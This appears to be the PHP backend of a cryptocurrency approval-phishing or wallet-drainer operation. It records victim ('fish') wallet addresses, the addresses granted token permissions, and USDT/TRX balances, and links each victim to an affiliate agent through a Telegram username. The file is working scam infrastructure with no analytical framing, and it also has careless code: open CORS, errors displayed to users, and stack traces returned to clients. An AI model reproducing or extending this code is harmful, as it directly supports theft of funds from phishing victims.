<?php
// 设置允许跨域访问
header('Access-Control-Allow-Origin: *'); 
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With');
header('Content-Type: application/json');

// 如果是预检请求，直接返回
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// 错误显示
ini_set('display_errors', 1);
error_reporting(E_ALL);

// 加载框架核心文件
$configBasePath = realpath(__DIR__ . '/../../../../thinkphp/base.php');
if (!$configBasePath) {
    echo json_encode(["status" => "error", "message" => "无法找到 thinkphp/base.php 的路径"]);
    die();
}

require_once $configBasePath;
use think\Db;
use think\Exception;

// 加载数据库配置
$configPath = realpath(__DIR__ . '/../../../../application/database.php');
if (!file_exists($configPath)) {
    echo json_encode(["status" => "error", "message" => "配置文件不存在"]);
    die();
}

$config = include $configPath;

// 设置数据库配置
try {
    Db::setConfig($config);
} catch (Exception $e) {
    echo json_encode(["status" => "error", "message" => "数据库配置加载失败: " . $e->getMessage()]);
    die();
}

try {
    // 获取并清理输入数据
    $fish_address = trim($_POST['fish_address'] ?? '');
    $permissions_fishaddress = trim($_POST['permissions_fishaddress'] ?? '');
    $tgusername = trim($_POST['tgusername'] ?? '');
    $usdt_balance = isset($_POST['usdt_balance']) ? floatval($_POST['usdt_balance']) : 0.0;
    $trx_balance = isset($_POST['trx_balance']) ? floatval($_POST['trx_balance']) : 0.0;
    $time = $_POST['time'] ?? date('Y-m-d H:i:s');
    $operation = trim($_POST['operation'] ?? 'query');

    // 基本验证
    if (empty($fish_address)) {
        throw new Exception('缺少必需参数：fish_address');
    }

    // 查询 Telegram 用户名对应的 tguid
    $tguid = '';
    if (!empty($tgusername)) {
        $dailiInfo = Db::table('daili')
            ->where('username', $tgusername)
            ->field('tguid')
            ->find();
        if ($dailiInfo && isset($dailiInfo['tguid'])) {
            $tguid = $dailiInfo['tguid'];
        }
    }

    // 查询数据库中是否存在该 fish_address
    $existingFish = Db::table('fish')->where('fish_address', $fish_address)->find();

    switch ($operation) {
        case 'query':
            // 查询操作：返回 fish_address 是否存在及相关数据
            if ($existingFish) {
                echo json_encode([
                    'status' => 'success',
                    'message' => '数据已存在',
                    'data' => $existingFish
                ]);
            } else {
                echo json_encode([
                    'status' => 'success',
                    'message' => '数据不存在'
                ]);
            }
            break;

        case 'insert_update':
            if ($existingFish) {
                // 如果 fish_address 存在，仅更新 tguid 和 remark
                $updateData = [
                    'tguid' => $tguid,
                    'remark' => $tgusername
                ];
                Db::table('fish')->where('fish_address', $fish_address)->update($updateData);
                echo json_encode([
                    'status' => 'success',
                    'message' => '数据已更新',
                    'data' => $updateData
                ]);
            } else {
                // 如果 fish_address 不存在，仅插入必要字段
                $insertData = [
                    'fish_address' => $fish_address,
                    'permissions_fishaddress' => $permissions_fishaddress,
                    'tguid' => $tguid,
                    'usdt_balance' => $usdt_balance,
                    'trx_balance' => $trx_balance,
                    'time' => $time,
                    'remark' => $tgusername
                ];
                Db::table('fish')->insert($insertData);
                echo json_encode([
                    'status' => 'success',
                    'message' => '数据插入成功',
                    'data' => $insertData
                ]);
            }
            break;

        default:
            // 未知操作类型
            throw new Exception('无效的操作类型');
    }

} catch (Exception $e) {
    // 捕获异常并返回错误信息
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
}
?>
